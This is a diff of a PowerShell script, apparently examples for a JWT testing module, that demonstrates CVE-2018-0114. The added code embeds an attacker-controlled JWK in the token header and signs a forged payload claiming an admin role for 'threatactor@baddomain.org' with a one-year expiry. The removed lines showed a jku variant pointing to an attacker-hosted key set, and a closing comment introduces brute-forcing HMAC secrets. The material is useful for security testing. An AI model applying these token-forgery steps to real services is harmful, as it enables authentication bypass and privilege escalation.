@@ -181,21 +181,34 @@ $signedJwt = "{0}.{1}" -f $jwtSansSig, $signature
 
 
 # CVE-2018-0114 vulnerability
-# 1. Acquire JWT:
+# 1. Acquire existing JWT that is used by API endpoint:
 $jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
 
 # 2. Get cert used to sign token via RSA-SHA256:
-$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
+# $cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
+
+$cert = Get-MySigningCert
 
 # 3. Deserialize existing payload:
-[System.Collections.Hashtable]$payload = Get-JsonWebTokenPayload -JsonWebToken $jwt
+$jwtPayload = Get-JsonWebTokenPayload -JsonWebToken $jwt -AsEncodedString
 
-# 4. Generate JWK set to be placed on http://myserver/jwkcollection/jwks.json:
-$cert | New-JsonWebKeySet -Compress | Out-File -FilePath "~/certs/jwks.json" -Encoding ascii
+# 4. Generate JWK to be placed in header:
+$jwk = $cert | New-JsonWebKey
 
-# 5. Create token with jku claim in header signed by certificate with private key defined in step 2:
-$jwkUri = "http://myserver/jwkcollection/jwks.json"
-$newJwt = New-JsonWebToken -Claims $payload -HashAlgorithm SHA256 -SigningCertificate $cert -JwkUri $jwkUri -TimeToLive 300
+# 4. Generate JWK to be placed in header:
+$jwk = $cert | New-JsonWebKey
+
+# 5. Craft JWT header with JWK inserted as jwk claim as well as the kid and x5t claims being populated with the JWKs key identifier (kid):
+$jwtHeader = @{typ = "JWT"; alg = "RS256"; jwk = $jwk; kid = $jwk.kid; x5t = $jwk.kid } | ConvertTo-JwtPart
+
+# 6. Build the JWT payload with an expiration of one year:
+$jwtExpiration = (Get-Date).AddMonths(12) | Convert-DateTimeToEpoch
+$jwtPayload = @{sub = "threatactor@baddomain.org"; role = "admin"; exp = $jwtExpiration } | ConvertTo-JwtPart
+
+# 7. Generate the JWT signature and append it to the header and payload to complete the JWT:
+$jwtSansSig = "$jwtHeader.$jwtPayload"
+$jwtSignature = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -SigningCertificate $cert
+$newJwt = "$jwtSansSig.$jwtSignature"
 
 
 #  Brute force an HMAC-SHA256 JWT in an attempt to obtain the secret used to sign it
